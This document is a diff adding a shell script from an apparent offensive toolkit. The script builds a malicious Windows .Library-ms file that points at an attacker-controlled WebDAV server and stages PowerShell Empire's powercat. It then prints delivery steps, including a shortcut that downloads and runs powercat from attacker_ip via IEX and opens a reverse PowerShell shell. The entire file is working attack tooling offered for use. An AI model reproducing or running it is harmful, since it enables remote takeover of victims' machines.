@@ -1,0 +1,30 @@
+mkdir -p packstation/outbound/webdav; \
+echo '<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/webdav_port)%></url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+' > packstation/outbound/webdav/config.Library-ms; \
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound/;
+
+echo "1. Start a revshell listener: <%echo $(esh scripts/listener-nc)%>"; \
+echo "2. Start a webserver for powercat: python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound"; \
+echo "3. Using windows, create a shortcut file with the following target: "; \
+echo 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powercat.ps1\');powercat -c <%=$(esh variables/attacker_ip)%> -p <%=$(esh variables/shell_port)%> -e powershell" '; \
+echo "4. Place this shortcut file into packstation/outbound/webdav"; \
+echo "4. Start a webdav server: wsgidav --host=0.0.0.0 --port=<%=$(esh variables/webdav_port)%> --auth=anonymous --root packstation/outbound/webdav/"; \
+echo "6. Deliver the webdav-link-file config.Library-ms (created in packstation/outbound/webdav) to your target"
